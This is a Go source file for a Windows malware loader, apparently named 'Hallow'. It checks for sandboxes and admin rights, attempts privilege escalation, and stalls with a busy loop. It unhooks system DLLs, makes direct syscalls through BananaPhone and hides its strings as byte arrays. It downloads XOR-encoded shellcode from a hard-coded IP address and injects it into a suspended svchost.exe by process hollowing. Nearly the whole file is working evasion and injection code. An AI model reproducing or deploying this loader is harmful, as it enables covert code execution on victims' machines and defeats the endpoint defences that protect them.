package main

import (
	"Hallow/core"
	"encoding/binary"
	"fmt"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

func main() {
	shellcodeUrl := "http://192.168.178.93/lol.bin"
	core.CheckSandbox()
	_, fileName, lineNum, _ := runtime.Caller(0)
	fmt.Printf("%s: %d\n", fileName, lineNum)
	check, _ := core.CheckHighPrivs()
	if !check {
		user, _ := user.Current()
		core.Escalate(fmt.Sprintf("C:\\Users\\%s\\AppData\\Local\\Temp\\netutils.exe", user.Name))
		return
	}
	sdawewe()
	xoredShellcode := getShellCode(shellcodeUrl)
	core.Ekko(10000)
	tryHollowExecutable(xoredShellcode)
}

func sdawewe() {
	const S = 500000
	for i := 0; i <= S; i++ {
		for j := 2; j <= i/2; j++ {
			if i%j == 0 {
				break
			}
		}
	}
}

var Version string

func unload() {
	Version = versionFunc()
	if Version == "10.0" {
		err := core.RefreshPE(string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
		if err != nil {
			log.Println("RefreshPE failed:", err)
		}
		err = core.RefreshPE(string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
		if err != nil {
			log.Println("RefreshPE failed:", err)
		}
		err = core.RefreshPE(string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
		if err != nil {
			log.Println("RefreshPE failed:", err)
		}
	}

}
func versionFunc() string {
	k, _ := registry.OpenKey(registry.LOCAL_MACHINE, string([]byte{'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}), registry.QUERY_VALUE)
	Version, _, _ := k.GetStringValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}))
	majorVersion, _, err := k.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'a', 'j', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
	if err == nil {
		minorVersion, _, _ := k.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'i', 'n', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
		Version = strconv.FormatUint(majorVersion, 10) + "." + strconv.FormatUint(minorVersion, 10)
	}
	defer k.Close()

	return Version
}

type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}

func banana() uint16 {
	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	zwQueryInformationProcess, e := bp.GetSysID(string([]byte{'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's'}))
	if e != nil {
		panic(e)
	}

	return zwQueryInformationProcess
}

func tryHollowExecutable(xoredShellcode []byte) {
	path := string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e'})

	_, err := os.Stat(path)
	if err != nil {
		log.Fatal(err)
	}

	kernel32 := syscall.MustLoadDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
	createProcessA := kernel32.MustFindProc(string([]byte{'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A'}))
	readProcessMemory := kernel32.MustFindProc(string([]byte{'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y'}))
	writeProcessMemory := kernel32.MustFindProc(string([]byte{'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y'}))
	resumeThread := kernel32.MustFindProc(string([]byte{'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd'}))

	unload()

	zwQueryInformationProcess := banana()

	startupInfo := &syscall.StartupInfo{}
	processInfo := &syscall.ProcessInformation{}
	pathArray := append([]byte(path), byte(0))

	createProcessA.Call(0, uintptr(unsafe.Pointer(&pathArray[0])), 0, 0, 0, 0x4, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(processInfo)))

	pointerSize := unsafe.Sizeof(uintptr(0))
	basicInfo := &PROCESS_BASIC_INFORMATION{}
	tmp := 0
	bananaphone.Syscall(zwQueryInformationProcess, uintptr(processInfo.Process), 0, uintptr(unsafe.Pointer(basicInfo)), pointerSize*6, uintptr(unsafe.Pointer(&tmp)))

	imageBaseAddress := basicInfo.PebAddress + 0x10
	addressBuffer := make([]byte, pointerSize)
	read := 0
	readProcessMemory.Call(uintptr(processInfo.Process), imageBaseAddress, uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	imageBaseValue := binary.LittleEndian.Uint64(addressBuffer)
	addressBuffer = make([]byte, 0x200)
	readProcessMemory.Call(uintptr(processInfo.Process), uintptr(imageBaseValue), uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	lfaNewPos := addressBuffer[0x3c : 0x3c+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := addressBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	entrypointAddress := imageBaseValue + uint64(entrypointRVA)

	time.Sleep(1 * time.Second)
	mean := string([]byte{'m', 'a', 't', 'r', 'i', 'x', 'm', 'a', 'n'})
	shellcode := xorWithKey(xoredShellcode, mean)
	writeProcessMemory.Call(uintptr(processInfo.Process), uintptr(entrypointAddress), uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	resumeThread.Call(uintptr(processInfo.Thread))
}

func getShellCode(shellcodeUrl string) []byte {
	client := &http.Client{}
	req, _ := http.NewRequest(http.MethodGet, shellcodeUrl, nil)
	resp, _ := client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	xoredShellcode := body
	return xoredShellcode
}

func xorWithKey(data []byte, key string) []byte {
	keyBytes := []byte(key)
	xored := make([]byte, len(data))

	for i := 0; i < len(data); i++ {
		xored[i] = data[i] ^ keyBytes[i%len(keyBytes)]
	}
	return xored
}
